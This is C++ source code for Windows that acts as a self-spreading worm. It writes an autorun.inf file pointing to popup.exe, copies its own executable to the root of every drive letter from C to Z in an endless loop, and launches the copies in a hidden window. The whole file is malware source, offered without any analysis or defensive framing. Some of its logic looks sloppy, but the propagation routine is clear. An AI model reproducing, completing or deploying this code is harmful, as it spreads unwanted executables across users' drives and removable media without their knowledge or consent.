#include<iostream>
#include<windows.h>
#include<conio.h>
#include<fstream>
using namespace std;
 
 
void writefile(){
     ofstream run;
 run.open("autorun.inf");
 run<<"[autorun]"<<endl;
 run<<"shellexecute=popup.exe"<<endl;
 run.close();
}
 
 
int main(int argc,char **argv){
char drive,drive2;
char buffer[50];
char buffer2[50];
char location[50];
char dir[5];
writefile();
 
 
 
while(1){
      
     drive='C';
     drive2='B';    
for(drive2='B';drive2<='Z';drive2++){
           sprintf(location,"%c:\\popup.exe",drive2);                         
           sprintf(dir,"%c:\\",drive2);
       for(drive='C';drive<='Z';drive++){
 
           sprintf(buffer,"%c:\\popup.exe",drive);
              sprintf(buffer2,"%c:\\autorun.inf",drive2);   
 
cout<<buffer<<" from"<<argv[0]<<endl;
 
CopyFile(argv[0],buffer,FALSE);
 
}
cout<<drive2<<"-->"<<location<<"-->"<<dir<<endl;
ShellExecute( NULL, "open", location, "xxx",dir , SW_HIDE);
}
 
 getch();   
}
}